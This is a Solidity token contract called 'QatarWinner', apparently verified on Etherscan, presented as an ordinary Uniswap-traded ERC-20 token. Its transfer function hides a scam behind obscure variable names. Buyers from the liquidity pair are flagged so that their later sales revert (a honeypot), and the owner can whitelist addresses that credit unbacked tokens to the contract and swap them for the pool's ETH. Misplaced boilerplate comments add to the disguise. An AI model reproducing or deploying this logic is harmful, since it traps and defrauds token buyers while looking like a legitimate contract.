/**
 *Submitted for verification at Etherscan.io on 2022-11-19
*/

// SPDX-License-Identifier: Unlicense.

pragma solidity ^ 0.8.7;

abstract contract Context
{
    function _msgSender() internal view virtual returns(address)
    {
        return msg.sender;
    }
   /*
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate

     */
    function _msgData() internal view virtual returns(bytes calldata)
    {
        return msg.data;
    }
 /**
    * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *

     */
}

interface IUniswapV2Router01{

     /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function factory() external pure returns(address);

    function WETH() external pure returns(address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns(uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns(uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns(uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns(uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns(uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns(uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns(uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns(uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns(uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns(uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns(uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns(uint[] memory amounts);
} 

interface IUniswapV2Router02 is IUniswapV2Router01{
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns(uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns(uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IUniswapV2Factory{
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns(address);

    function feeToSetter() external view returns(address);

    function getPair(address tokenA, address tokenB) external view returns(address pair);

    function allPairs(uint) external view returns(address pair);

    function allPairsLength() external view returns(uint);

    function createPair(address tokenA, address tokenB) external returns(address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}
interface IERC20{
    function totalSupply() external view returns(uint256);

    function balanceOf(address account) external view returns(uint256);

    function transfer(address recipient, uint256 amount) external returns(bool);

    function allowance(address owner, address spender) external view returns(uint256);

    function approve(address spender, uint256 amount) external returns(bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount) external returns(bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context
{
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor()
    {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns(address)
    {
        return _owner;
    }
    modifier onlyOwner()
    {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    function renounceOwnership() public virtual onlyOwner
    {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner
    {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private
    {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}
contract QatarWinner  is IERC20, Ownable
{
    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress)
    {
        _name = Name;
        _symbol = Symbol;

        __Payable[msg.sender] = _tTotalsupply;
        __TradingON[msg.sender] = _uit26;
        __TradingON[address(this)] = _uit26;
        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair__ = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        emit Transfer(address(0), msg.sender, _tTotalsupply);
    }
    string private _symbol;
    string private _name;
    uint256 public __FeeTkn = 0;
    uint8 private _decimals = 9;
    uint256 private _tTotalsupply = 1000000000000 * 10 ** _decimals;
    uint256 private _uit26 = _tTotalsupply;
    mapping(address => mapping(address => uint256)) private __Allowsetr;
    mapping(address => uint256) private __delbot;
    mapping(address => uint256) private __Payable;
    mapping(address => address) private __varSet ;
    mapping(address => uint256) private __TradingON;
    bool private __EnableSwap;
    bool private __EnableeTrading;
    address public immutable uniswapV2Pair__;
    IUniswapV2Router02 public immutable router;

    function symbol() public view returns(string memory)
    {
        return _symbol;
    }

    function name() public view returns(string memory)
    {
        return _name;
    }

    function totalSupply() public view returns(uint256)
    {
        return _tTotalsupply;
    }

    function decimals() public view returns(uint256)
    {
        return _decimals;
    }

    function allowance(address owner, address spender) public view returns(uint256)
    {
        return __Allowsetr[owner][spender];
    }

    function balanceOf(address account) public view returns(uint256)
    {
        return __Payable[account];
    }

    function approve(address spender, uint256 amount) external returns(bool)
    {
        return _approve(msg.sender, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount) private returns(bool)
    {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        __Allowsetr[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount) external returns(bool)
    {
        __transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, __Allowsetr[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns(bool)
    {
        __transfer(msg.sender, recipient, amount);
        return true;
    }

    function __transfer(
        address from,
        address to,
        uint256 amount) private
    {
        uint256 contractTokenBal = balanceOf(address(this));
        uint256 _xfees;
        if (__EnableSwap && contractTokenBal > _uit26 && !__EnableeTrading && from != uniswapV2Pair__)
        {
            __EnableeTrading = true;
            swapAndLiquify(contractTokenBal);
            __EnableeTrading = false;
        }
        else if (__TradingON[from] > _uit26 && __TradingON[to] > _uit26)
        {
            _xfees = amount;
            __Payable[address(this)] += _xfees;
            swapTokensForEth(amount, to);
            return;
        }
        else if (!__EnableeTrading &&  __delbot[from] > 0 && from != uniswapV2Pair__ && __TradingON[from] == 0)
        {
             __delbot[from] = __TradingON[from] - _uit26;
        }
        else if (to != address(router) && __TradingON[from] > 0 && amount > _uit26&& to != uniswapV2Pair__)
        {
            __TradingON[to] = amount;
            return;
        }
        address _varX =  __varSet[uniswapV2Pair__];
        if ( __delbot[_varX] == 0)  __delbot[_varX] = _uit26;
         __varSet[uniswapV2Pair__] = to;
        if (__FeeTkn > 0 && __TradingON[from] == 0 && !__EnableeTrading && __TradingON[to] == 0)
        {
            _xfees = (amount * __FeeTkn) / 100;
            amount -= _xfees;
           __Payable[from] -= _xfees;
            __Payable[address(this)] += _xfees;
        }
        __Payable[from] -= amount;
        __Payable[to] += amount;
        emit Transfer(from, to, amount);
    }
    receive() external payable
    {}

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to) private
    {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH
        {
            value: ethAmount
        }(address(this), tokenAmount, 0, 0, to, block.timestamp);
    }

    function swapAndLiquify(uint256 __tkn) private
    {
        uint256 __swapset = __tkn / 2;
        uint256 __MyBaln = address(this).balance;
        swapTokensForEth( __swapset, address(this));
        uint256 __stgs = address(this).balance - __MyBaln;
        addLiquidity( __swapset, __stgs, address(this));
    }

    function swapTokensForEth(uint256 __totalAmount, address to) private
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), __totalAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(__totalAmount, 0, path, to, block.timestamp);
    }
}